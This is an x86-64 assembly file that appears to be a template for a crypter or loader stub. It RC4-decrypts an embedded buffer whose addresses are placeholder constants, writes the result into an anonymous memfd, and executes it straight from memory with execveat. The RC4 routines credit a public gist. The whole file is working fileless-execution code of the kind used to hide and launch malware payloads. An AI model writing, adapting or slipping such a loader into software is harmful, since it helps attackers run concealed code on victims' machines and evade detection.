_start:
    push %rbp
    mov %rsp, %rbp
    sub $0x100, %rsp # allocate space for key schedule

    mov %rsp, %rdi 
    mov $0x100, %rsi
    call _KSA # make key schedule. param1 = key schedule buffer, param2 = key schedule size

    mov $0xBBBBBBBBBBBBBBBB, %r8 # address of buffer to encrypt
    mov $0xCCCCCCCCCCCCCCCC, %r9 # size of buffer to encrypt

    call _PRGA # encrypt buffer with RC4

    mov $0xAAAAAAAAAAAAAAAA, %rdi # address of name of fd to create
    xor %rsi, %rsi
    mov $319, %rax # memfd_create syscall
    syscall
    mov %rax, %r12
    cmp $0xFFFFFFFFFFFFFFFF, %rax # exit if error
    mov $3, %rdi 
    je _exit

    mov %r12, %rdi
    mov $0xBBBBBBBBBBBBBBBB, %rsi # address of encrypted buffer
    mov $0xCCCCCCCCCCCCCCCC, %rdx # size of encrypted buffer
    mov $1, %rax # write syscall
    syscall
    mov $0xCCCCCCCCCCCCCCCC, %rdx # size of encrypted buffer
    cmp %rdx, %rax # exit if error (not all bytes written)
    mov $4, %rdi
    jne _exit

    mov %r12, %rdi
    mov $0xDDDDDDDDDDDDDDDD, %rsi # address of empty string
    xor %rdx, %rdx
    xor %rcx, %rcx
    xor %r10, %r10
    mov $0x1000, %r8 # AT_EMPTY_PATH
    mov $322, %rax # execveat syscall
    syscall
    mov $5, %rdi # exit if error (this line should never be reached)

_exit:
    mov $60, %rax # exit syscall
    syscall



# The following code was based off of https://gist.github.com/rverton/a44fc8ca67ab9ec32089

# rdi = key schedule buffer
# rsi = 0x100 (256) = N
# r8 = plaintext=ciphertext
# r9 = len(ciphertext)
_PRGA:
    xor %rdx, %rdx # n
    xor %rcx, %rcx # i
    xor %rbx, %rbx # j
_PRGA_loop:
    cmp %rdx, %r9
    je _PRGA_end

    # i = (i + 1) % N;
    inc %rcx
    and $255, %rcx

    # j = (j + S[i]) % N;
    add (%rdi, %rcx), %bl
    and $255, %bl

    # swap(&S[i], &S[j]);
    movb (%rdi, %rcx), %r10b
    movb (%rdi, %rbx), %r11b
    movb %r10b, (%rdi, %rbx)   
    movb %r11b, (%rdi, %rcx)

    # int rnd = S[(S[i] + S[j]) % N];
    xor %r10, %r10
    add (%rdi, %rcx), %r10b
    add (%rdi, %rbx), %r10b
    and $255, %r10b
    mov (%rdi, %r10), %r10b

    # ciphertext[n] = rnd ^ plaintext[n];
    movb (%r8, %rdx), %r11b
    xorb %r10b, %r11b
    movb %r11b, (%r8, %rdx)

    inc %rdx
    jmp _PRGA_loop
    
_PRGA_end:
    ret


# The following code was based off of https://gist.github.com/rverton/a44fc8ca67ab9ec32089

_KSA:
    xor %rdx, %rdx
_init_key:
    cmp %rdx, %rsi
    je _scramble_key_start
    movb %dl, (%rdi, %rdx)
    inc %rdx
    jmp _init_key
_scramble_key_start:
    xor %rdx, %rdx # i
    xor %rcx, %rcx # j
    mov $0x1234567812345678, %rax # key
_scramble_key_loop:
    cmp %rdx, %rsi
    je _scramble_key_end

    # j += S[i]
    add (%rdi, %rdx), %cl

    # j += key[i % len];
    mov %dl, %bl # rbx = i
    and $7, %bl # rbx %= len
    inc %bl # rbx += 1
    shl $3, %rbx
    mov $64, %r8b # r8 = 64
    sub %bl, %r8b # r8 = 64 - ((rbx + 1) * 8)
    mov %rax, %r9 # r9 = key

    push %rcx
    mov %r8b, %cl
    shr %cl, %r9 # r9 = r9 >> r8, where r8 is the shift value
    pop %rcx
    and $0xFF, %r9b # r9 = r9 & 0xFF
    add %r9b, %cl # j += r9

    # j %= N
    and $255, %cl

    # swap(&S[i], &S[j]);
    movb (%rdi, %rdx), %r8b
    movb (%rdi, %rcx), %r9b
    movb %r9b, (%rdi, %rdx)
    movb %r8b, (%rdi, %rcx)   

    # i++
    inc %rdx
    jmp _scramble_key_loop
_scramble_key_end:
    ret

